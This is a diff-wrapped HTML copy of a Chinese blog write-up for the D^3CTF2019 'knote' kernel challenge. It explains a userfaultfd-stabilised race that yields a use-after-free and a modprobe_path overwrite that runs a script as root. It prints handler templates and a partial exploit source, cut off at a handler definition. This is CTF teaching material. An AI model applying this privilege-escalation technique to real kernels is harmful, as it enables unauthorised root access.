@@ -1,0 +1,339 @@
+<!doctype html><html><head lang=en><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>D^3CTF2019-knote-WP - blog of chuj</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="本博客的第 200 篇文章，[font color=&#34;#FA8072&#34;] cheer! [/font] 这道题是老学长 Aris 出的，借着这道题学习了一下用 userfaultfd 机制稳定条件竞争的方法。我确实还是比较菜，又是完全照着 ha1vk 师"><meta property="og:image" content><meta property="og:title" content="D^3CTF2019-knote-WP"><meta property="og:description" content="本博客的第 200 篇文章，[font color=&#34;#FA8072&#34;] cheer! [/font] 这道题是老学长 Aris 出的，借着这道题学习了一下用 userfaultfd 机制稳定条件竞争的方法。我确实还是比较菜，又是完全照着 ha1vk 师"><meta property="og:type" content="article"><meta property="og:url" content="https://chujdk.github.io/wp/1455.html"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-07-13T17:50:00+00:00"><meta property="article:modified_time" content="2021-07-13T17:50:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="D^3CTF2019-knote-WP"><meta name=twitter:description content="本博客的第 200 篇文章，[font color=&#34;#FA8072&#34;] cheer! [/font] 这道题是老学长 Aris 出的，借着这道题学习了一下用 userfaultfd 机制稳定条件竞争的方法。我确实还是比较菜，又是完全照着 ha1vk 师"><script src=https://chujdk.github.io/js/feather.min.js></script>
+<link href=https://chujdk.github.io/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=https://chujdk.github.io/css/main.ac08a4c9714baa859217f92f051deb58df2938ec352b506df655005dcaf98cc0.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js></script>
+<script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js onload=renderMathInElement(document.body)></script>
+<script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script><link rel=stylesheet type=text/css href=https://chujdk.github.io/css/font.e98a2c89163f90d6fa6d8baf5a50a6561f8ff3d0be1551265f364d138d75df33.css></head><body><div class=content><header><div class=main><a href=https://chujdk.github.io/>blog of chuj</a></div><nav><a href=/>Home</a>
+<a href=/posts.html>All posts</a>
+<a href=/about.html>About</a>
+<a href=/tags.html>Tags</a></nav></header><main><article><div class=title><h1 class=title>D^3CTF2019-knote-WP</h1><div class=meta>Posted on Jul 13, 2021</div></div><section class=body><p>本博客的第 200 篇文章，[font color="#FA8072"] cheer! [/font]</p><p>这道题是老学长 Aris 出的，借着这道题学习了一下用 userfaultfd 机制稳定条件竞争的方法。我确实还是比较菜，又是完全照着 ha1vk 师傅的文章<a href="https://blog.csdn.net/seaaseesa/article/details/104650794?utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-6.control&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-6.control">linux kernel pwn学习之条件竞争(二)userfaultfd</a>学习的。</p><h3 id=userfaultfd-机制>userfaultfd 机制</h3><p>这个机制给予了用户自己处理缺页异常的能力，原意是提高开发的灵活度，据说在虚拟机相关的开发上很有用。在这里的利用我们只需要用它能够暂停线程执行的能力即可，所以就不深入了，具体的可以参考<a href=https://man7.org/linux/man-pages/man2/userfaultfd.2.html> man 手册</a>，同时也有使用的<a href=http://blog.jcix.top/2018-10-01/userfaultfd_intro/>分析文章</a></p><p>ha1vk 师傅给了一个注册 handler 的模板，俺也不懂，就照抄了</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#902000>void</span> <span style=color:#06287e>err_exit</span>(<span style=color:#902000>char</span><span style=color:#666>*</span> err_msg)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>	puts(err_msg);
+</span></span><span style=display:flex><span>	exit(<span style=color:#666>-</span><span style=color:#40a070>1</span>);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#902000>void</span> <span style=color:#06287e>register_userfault</span>(<span style=color:#902000>void</span> <span style=color:#666>*</span>fault_page,<span style=color:#902000>void</span> <span style=color:#666>*</span>handler)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>	pthread_t thr;
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>uffdio_api</span> ua;
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>uffdio_register</span> ur;
+</span></span><span style=display:flex><span>	<span style=color:#902000>uint64_t</span> uffd  <span style=color:#666>=</span> syscall(__NR_userfaultfd, O_CLOEXEC <span style=color:#666>|</span> O_NONBLOCK);
+</span></span><span style=display:flex><span>	ua.api <span style=color:#666>=</span> UFFD_API;
+</span></span><span style=display:flex><span>	ua.features    <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (ioctl(uffd, UFFDIO_API, <span style=color:#666>&amp;</span>ua) <span style=color:#666>==</span> <span style=color:#666>-</span><span style=color:#40a070>1</span>)
+</span></span><span style=display:flex><span>		err_exit(<span style=color:#4070a0>&#34;[-] ioctl-UFFDIO_API&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	ur.range.start <span style=color:#666>=</span> (<span style=color:#902000>unsigned</span> <span style=color:#902000>long</span>)fault_page; <span style=color:#60a0b0;font-style:italic>//我们要监视的区域
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>	ur.range.len   <span style=color:#666>=</span> PAGE_SIZE;
+</span></span><span style=display:flex><span>	ur.mode        <span style=color:#666>=</span> UFFDIO_REGISTER_MODE_MISSING;
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (ioctl(uffd, UFFDIO_REGISTER, <span style=color:#666>&amp;</span>ur) <span style=color:#666>==</span> <span style=color:#666>-</span><span style=color:#40a070>1</span>) <span style=color:#60a0b0;font-style:italic>//注册缺页错误处理
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>        <span style=color:#60a0b0;font-style:italic>//当发生缺页时，程序会阻塞，此时，我们在另一个线程里操作
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>		err_exit(<span style=color:#4070a0>&#34;[-] ioctl-UFFDIO_REGISTER&#34;</span>);
+</span></span><span style=display:flex><span>	<span style=color:#60a0b0;font-style:italic>//开一个线程，接收错误的信号，然后处理
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>	<span style=color:#902000>int</span> s <span style=color:#666>=</span> pthread_create(<span style=color:#666>&amp;</span>thr, <span style=color:#007020>NULL</span>,handler, (<span style=color:#902000>void</span><span style=color:#666>*</span>)uffd);
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (s<span style=color:#666>!=</span><span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>		err_exit(<span style=color:#4070a0>&#34;[-] pthread_create&#34;</span>);
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>然后是 handler 的写法，开头是一些模板化的操作</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#902000>void</span><span style=color:#666>*</span> <span style=color:#06287e>userfaultfd_leak_handler</span>(<span style=color:#902000>void</span><span style=color:#666>*</span> arg)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>uffd_msg</span> msg;
+</span></span><span style=display:flex><span>	<span style=color:#902000>unsigned</span> <span style=color:#902000>long</span> uffd <span style=color:#666>=</span> (<span style=color:#902000>unsigned</span> <span style=color:#902000>long</span>) arg;
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>pollfd</span> pollfd;
+</span></span><span style=display:flex><span>	<span style=color:#902000>int</span> nready;
+</span></span><span style=display:flex><span>	pollfd.fd <span style=color:#666>=</span> uffd;
+</span></span><span style=display:flex><span>	pollfd.events <span style=color:#666>=</span> POLLIN;
+</span></span><span style=display:flex><span>	nready <span style=color:#666>=</span> poll(<span style=color:#666>&amp;</span>pollfd, <span style=color:#40a070>1</span>, <span style=color:#666>-</span><span style=color:#40a070>1</span>);
+</span></span></code></pre></div><p>定义一个 uffd_msg 类型的结构体在未来接受消息。</p><p>需要一个 pollfd 类型的结构体提供给轮询操作，其 fd 设置为传入的 arg，events 设置为 POLLIN。然后执行 <code>poll(&amp;pollfd, 1, -1);</code> 来进行轮询，这个函数会一直进行轮询，直到出现缺页错误。</p><p>然后需要处理缺页</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>	sleep(<span style=color:#40a070>3</span>);
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (nready <span style=color:#666>!=</span> <span style=color:#40a070>1</span>)
+</span></span><span style=display:flex><span>	{
+</span></span><span style=display:flex><span>		ErrExit(<span style=color:#4070a0>&#34;[-] Wrong poll return val&#34;</span>);
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>	nready <span style=color:#666>=</span> read(uffd, <span style=color:#666>&amp;</span>msg, <span style=color:#007020;font-weight:700>sizeof</span>(msg));
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (nready <span style=color:#666>&lt;=</span> <span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>	{
+</span></span><span style=display:flex><span>		ErrExit(<span style=color:#4070a0>&#34;[-] msg err&#34;</span>);
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#902000>char</span><span style=color:#666>*</span> page <span style=color:#666>=</span> (<span style=color:#902000>char</span><span style=color:#666>*</span>) mmap(<span style=color:#007020>NULL</span>, PAGE_SIZE, PROT_READ <span style=color:#666>|</span> PROT_WRITE, MAP_PRIVATE <span style=color:#666>|</span> MAP_ANONYMOUS, <span style=color:#666>-</span><span style=color:#40a070>1</span>, <span style=color:#40a070>0</span>);
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (page <span style=color:#666>==</span> MAP_FAILED)
+</span></span><span style=display:flex><span>	{
+</span></span><span style=display:flex><span>		ErrExit(<span style=color:#4070a0>&#34;[-] mmap err&#34;</span>);
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>uffdio_copy</span> uc;
+</span></span><span style=display:flex><span>	<span style=color:#60a0b0;font-style:italic>// init page
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>	memset(page, <span style=color:#40a070>0</span>, <span style=color:#007020;font-weight:700>sizeof</span>(page));
+</span></span><span style=display:flex><span>	uc.src <span style=color:#666>=</span> (<span style=color:#902000>unsigned</span> <span style=color:#902000>long</span>) page;
+</span></span><span style=display:flex><span>	uc.dst <span style=color:#666>=</span> (<span style=color:#902000>unsigned</span> <span style=color:#902000>long</span>) msg.arg.pagefault.address <span style=color:#666>&amp;</span> <span style=color:#666>~</span>(PAGE_SIZE <span style=color:#666>-</span> <span style=color:#40a070>1</span>);
+</span></span><span style=display:flex><span>	uc.len <span style=color:#666>=</span> PAGE_SIZE;
+</span></span><span style=display:flex><span>	uc.mode <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
+</span></span><span style=display:flex><span>	uc.copy <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
+</span></span><span style=display:flex><span>	ioctl(uffd, UFFDIO_COPY, <span style=color:#666>&amp;</span>uc);
+</span></span><span style=display:flex><span>	puts(<span style=color:#4070a0>&#34;[+] leak handler done&#34;</span>);
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>return</span> <span style=color:#007020>NULL</span>;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>注意在开头加入了 sleep 操作，在 poll 结束返回时就代表着出现了缺页了，此时 sleep 就可以起到暂停线程的效果。然后进行一些判断什么的，并 mmap 一个页给缺页的页，都是模板化的操作。此处 mmap 的内存在缺页时有自己的处理函数，所以不会一直套娃地缺页下去。</p><p>我们这里在遇到返回值错误的时候就直接错误退出了，在工程上应该会讲究一些，还会在外面套一个大死循环什么的，这里就不多说了，毕竟我们只需要利用它把线程暂停就可以了。</p><h3 id=分析>分析</h3><p>驱动主要注册了 ioctl 操作，实现了一个笔记管理器，有增删查改的功能。除了 edit 和 get 操作之外每个操作都有锁保护，所以不难想到在 edit 和 get 中可能存在条件竞争</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/07/2511554803.png></div><p><em>edit 和 get 只在拷贝方向上有区别，就不放 get 了</em></p><p>以 edit 为例，由于执行时没有加锁，所以 edit 操作遇到中断时，别的操作也可以访问、修改 edit 使用到的全局变量。如果在执行 <code>copy_user_generic_unrolled(v1, mychunk.ptr, v2->_anon_0.size)</code> 前，edit 线程被中断，buf[v0].ptr 被别的线程修改（<strong>注意这里不是指 ptr 被修改，而是指 ptr 指向的内存的所有者被修改</strong>），那么就会把 mychunk.ptr 中的数据复制到一个非法的地址中。当然由于一个复制的操作执行起来很快，这种被修改的可能性比较小，但是如果有了 userfaultfd，就可以延长此线程的执行时间，给予别的线程足够的时间来修改 buf[v0].ptr。</p><p>具体的来说，我们用 mmap 来申请 mychunk.ptr 所指向的内存块，此时此内存块还未分配物理页框，我们为它注册一个 userfaultfd handler，在这个 handler 中我们用 sleep 暂停此线程的执行一段时间，然后在执行 <code>copy_user_generic_unrolled</code> 的时候就会触发缺页异常，执行我们的 handler，这段时间别的线程使用 dele 方法把 buf[v0].ptr kfree 掉，handler 结束后就可以实现 UAF 了。</p><p>get 也可以用同样的方法利用。</p><h3 id=利用>利用</h3><p>既然能通过条件竞争创造 UAF，那么利用其实就相对容易了，一般可以考虑通过 tty_struct attack 实现提权，当然这种方法比较繁琐，ha1vk 提到了一个更加容易的利用方式，即劫持 modprobe_path 的方法。此方法的详细介绍可以参考<a href=https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/>这篇文章（英文）</a>也有<a href=https://www.secpulse.com/archives/153929.html>翻译版本</a>。简单的来说就是在我们通过 system 函数执行一个未知格式（即无法识别魔数）的文件时，内核会以 root 权限执行 modprobe_path 路径（此路径默认为 <code>/sbin/modprobe</code>）指向的文件，如果我们能把 modprobe_path 修改为我们的恶意脚本的路径，然后通过 system 执行一个未知格式文件，就可以以 root 权限执行一些指令，就可以实现利用了。</p><p>那么做法就是先通过 UAF leak 出 modprobe_path 的地址，tty_struct 中存储了大量内核地址，可以通过其中的数据来泄露并计算得出。</p><p>然后再通过一个 UAF 修改一个空闲 chunk 的 next 指针，通过类似 tcache poisoning 的手段覆写 modprobe_path，使之指向一个我们提供的恶意脚本，修改 flag 的权限为所有用户可读即可得到 flag。</p><h3 id=exp>exp</h3><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;stdio.h&gt;</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;stdlib.h&gt;</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;stdint.h&gt;</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;unistd.h&gt;</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;fcntl.h&gt;</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;pthread.h&gt;</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;poll.h&gt;</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;string.h&gt;</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;assert.h&gt;</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;linux/userfaultfd.h&gt;</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;sys/ioctl.h&gt;</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;sys/syscall.h&gt;</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;sys/mman.h&gt;</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020></span>
+</span></span><span style=display:flex><span><span style=color:#007020>#define PAGE_SIZE 0x1000
+</span></span></span><span style=display:flex><span><span style=color:#007020>#define TTY_STRUCT_SIZE 0x2E0
+</span></span></span><span style=display:flex><span><span style=color:#007020></span>
+</span></span><span style=display:flex><span>size_t modprobe_path;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>CHUNK</span>
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>union</span> 
+</span></span><span style=display:flex><span>	{
+</span></span><span style=display:flex><span>		<span style=color:#902000>unsigned</span> <span style=color:#902000>int</span> size;
+</span></span><span style=display:flex><span>		<span style=color:#902000>unsigned</span> <span style=color:#902000>int</span> idx;
+</span></span><span style=display:flex><span>	};
+</span></span><span style=display:flex><span>	<span style=color:#902000>char</span><span style=color:#666>*</span> buf;
+</span></span><span style=display:flex><span>};
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#902000>void</span> <span style=color:#06287e>get</span>(<span style=color:#902000>int</span> fd, <span style=color:#902000>char</span><span style=color:#666>*</span> buf, <span style=color:#902000>int</span> idx)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>CHUNK</span> arg;
+</span></span><span style=display:flex><span>	arg.idx <span style=color:#666>=</span> idx;
+</span></span><span style=display:flex><span>	arg.buf <span style=color:#666>=</span> buf;
+</span></span><span style=display:flex><span>	ioctl(fd, <span style=color:#40a070>0x2333</span>, <span style=color:#666>&amp;</span>arg);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#902000>void</span> <span style=color:#06287e>edit</span>(<span style=color:#902000>int</span> fd, <span style=color:#902000>char</span><span style=color:#666>*</span> buf, <span style=color:#902000>int</span> idx)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>CHUNK</span> arg;
+</span></span><span style=display:flex><span>	arg.idx <span style=color:#666>=</span> idx;
+</span></span><span style=display:flex><span>	arg.buf <span style=color:#666>=</span> buf;
+</span></span><span style=display:flex><span>	ioctl(fd, <span style=color:#40a070>0x8888</span>, <span style=color:#666>&amp;</span>arg);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#902000>void</span> <span style=color:#06287e>dele</span>(<span style=color:#902000>int</span> fd, <span style=color:#902000>int</span> idx)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>CHUNK</span> arg;
+</span></span><span style=display:flex><span>	arg.idx <span style=color:#666>=</span> idx;
+</span></span><span style=display:flex><span>	arg.buf <span style=color:#666>=</span> <span style=color:#007020>NULL</span>;
+</span></span><span style=display:flex><span>	ioctl(fd, <span style=color:#40a070>0x6666</span>, <span style=color:#666>&amp;</span>arg);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#902000>void</span> <span style=color:#06287e>add</span>(<span style=color:#902000>int</span> fd, <span style=color:#902000>int</span> size)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>CHUNK</span> arg;
+</span></span><span style=display:flex><span>	arg.size <span style=color:#666>=</span> size;
+</span></span><span style=display:flex><span>	arg.buf <span style=color:#666>=</span> <span style=color:#007020>NULL</span>;
+</span></span><span style=display:flex><span>	ioctl(fd, <span style=color:#40a070>0x1337</span>, <span style=color:#666>&amp;</span>arg);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#902000>void</span> <span style=color:#06287e>ErrExit</span>(<span style=color:#902000>char</span><span style=color:#666>*</span> err_msg)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>	puts(err_msg);
+</span></span><span style=display:flex><span>	exit(<span style=color:#666>-</span><span style=color:#40a070>1</span>);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#902000>void</span> <span style=color:#06287e>RegisterUserfault</span>(<span style=color:#902000>void</span> <span style=color:#666>*</span>fault_page,<span style=color:#902000>void</span> <span style=color:#666>*</span>handler)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>	pthread_t thr;
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>uffdio_api</span> ua;
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>uffdio_register</span> ur;
+</span></span><span style=display:flex><span>	<span style=color:#902000>uint64_t</span> uffd  <span style=color:#666>=</span> syscall(__NR_userfaultfd, O_CLOEXEC <span style=color:#666>|</span> O_NONBLOCK);
+</span></span><span style=display:flex><span>	ua.api <span style=color:#666>=</span> UFFD_API;
+</span></span><span style=display:flex><span>	ua.features    <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (ioctl(uffd, UFFDIO_API, <span style=color:#666>&amp;</span>ua) <span style=color:#666>==</span> <span style=color:#666>-</span><span style=color:#40a070>1</span>)
+</span></span><span style=display:flex><span>		ErrExit(<span style=color:#4070a0>&#34;[-] ioctl-UFFDIO_API&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	ur.range.start <span style=color:#666>=</span> (<span style=color:#902000>unsigned</span> <span style=color:#902000>long</span>)fault_page; <span style=color:#60a0b0;font-style:italic>//我们要监视的区域
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>	ur.range.len   <span style=color:#666>=</span> PAGE_SIZE;
+</span></span><span style=display:flex><span>	ur.mode        <span style=color:#666>=</span> UFFDIO_REGISTER_MODE_MISSING;
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (ioctl(uffd, UFFDIO_REGISTER, <span style=color:#666>&amp;</span>ur) <span style=color:#666>==</span> <span style=color:#666>-</span><span style=color:#40a070>1</span>) <span style=color:#60a0b0;font-style:italic>//注册缺页错误处理，当发生缺页时，程序会阻塞，此时，我们在另一个线程里操作
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>		ErrExit(<span style=color:#4070a0>&#34;[-] ioctl-UFFDIO_REGISTER&#34;</span>);
+</span></span><span style=display:flex><span>	<span style=color:#60a0b0;font-style:italic>//开一个线程，接收错误的信号，然后处理
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>	<span style=color:#902000>int</span> s <span style=color:#666>=</span> pthread_create(<span style=color:#666>&amp;</span>thr, <span style=color:#007020>NULL</span>,handler, (<span style=color:#902000>void</span><span style=color:#666>*</span>)uffd);
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (s<span style=color:#666>!=</span><span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>		ErrExit(<span style=color:#4070a0>&#34;[-] pthread_create&#34;</span>);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#902000>void</span><span style=color:#666>*</span> <span style=color:#06287e>userfaultfd_leak_handler</span>(<span style=color:#902000>void</span><span style=color:#666>*</span> arg)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>uffd_msg</span> msg;
+</span></span><span style=display:flex><span>	<span style=color:#902000>unsigned</span> <span style=color:#902000>long</span> uffd <span style=color:#666>=</span> (<span style=color:#902000>unsigned</span> <span style=color:#902000>long</span>) arg;
+</span></span><span style=display:flex><span>	puts(<span style=color:#4070a0>&#34;[+] leak handler created&#34;</span>);
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>pollfd</span> pollfd;
+</span></span><span style=display:flex><span>	<span style=color:#902000>int</span> nready;
+</span></span><span style=display:flex><span>	pollfd.fd <span style=color:#666>=</span> uffd;
+</span></span><span style=display:flex><span>	pollfd.events <span style=color:#666>=</span> POLLIN;
+</span></span><span style=display:flex><span>	nready <span style=color:#666>=</span> poll(<span style=color:#666>&amp;</span>pollfd, <span style=color:#40a070>1</span>, <span style=color:#666>-</span><span style=color:#40a070>1</span>);
+</span></span><span style=display:flex><span>	sleep(<span style=color:#40a070>3</span>);
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (nready <span style=color:#666>!=</span> <span style=color:#40a070>1</span>)
+</span></span><span style=display:flex><span>	{
+</span></span><span style=display:flex><span>		ErrExit(<span style=color:#4070a0>&#34;[-] Wrong poll return val&#34;</span>);
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>	nready <span style=color:#666>=</span> read(uffd, <span style=color:#666>&amp;</span>msg, <span style=color:#007020;font-weight:700>sizeof</span>(msg));
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (nready <span style=color:#666>&lt;=</span> <span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>	{
+</span></span><span style=display:flex><span>		ErrExit(<span style=color:#4070a0>&#34;[-] msg err&#34;</span>);
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#902000>char</span><span style=color:#666>*</span> page <span style=color:#666>=</span> (<span style=color:#902000>char</span><span style=color:#666>*</span>) mmap(<span style=color:#007020>NULL</span>, PAGE_SIZE, PROT_READ <span style=color:#666>|</span> PROT_WRITE, MAP_PRIVATE <span style=color:#666>|</span> MAP_ANONYMOUS, <span style=color:#666>-</span><span style=color:#40a070>1</span>, <span style=color:#40a070>0</span>);
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (page <span style=color:#666>==</span> MAP_FAILED)
+</span></span><span style=display:flex><span>	{
+</span></span><span style=display:flex><span>		ErrExit(<span style=color:#4070a0>&#34;[-] mmap err&#34;</span>);
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>uffdio_copy</span> uc;
+</span></span><span style=display:flex><span>	<span style=color:#60a0b0;font-style:italic>// init page
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>	memset(page, <span style=color:#40a070>0</span>, <span style=color:#007020;font-weight:700>sizeof</span>(page));
+</span></span><span style=display:flex><span>	uc.src <span style=color:#666>=</span> (<span style=color:#902000>unsigned</span> <span style=color:#902000>long</span>) page;
+</span></span><span style=display:flex><span>	uc.dst <span style=color:#666>=</span> (<span style=color:#902000>unsigned</span> <span style=color:#902000>long</span>) msg.arg.pagefault.address <span style=color:#666>&amp;</span> <span style=color:#666>~</span>(PAGE_SIZE <span style=color:#666>-</span> <span style=color:#40a070>1</span>);
+</span></span><span style=display:flex><span>	uc.len <span style=color:#666>=</span> PAGE_SIZE;
+</span></span><span style=display:flex><span>	uc.mode <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
+</span></span><span style=display:flex><span>	uc.copy <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
+</span></span><span style=display:flex><span>	ioctl(uffd, UFFDIO_COPY, <span style=color:#666>&amp;</span>uc);
+</span></span><span style=display:flex><span>	puts(<span style=color:#4070a0>&#34;[+] leak handler done&#34;</span>);
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>return</span> <span style=color:#007020>NULL</span>;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#902000>void</span><span style=color:#666>*</span> <span style=color:#06287e>userfaultfd_haijack_next_ptr_handler</span>(<span style=color:#902000>void</span><span style=color:#666>*</span> arg)
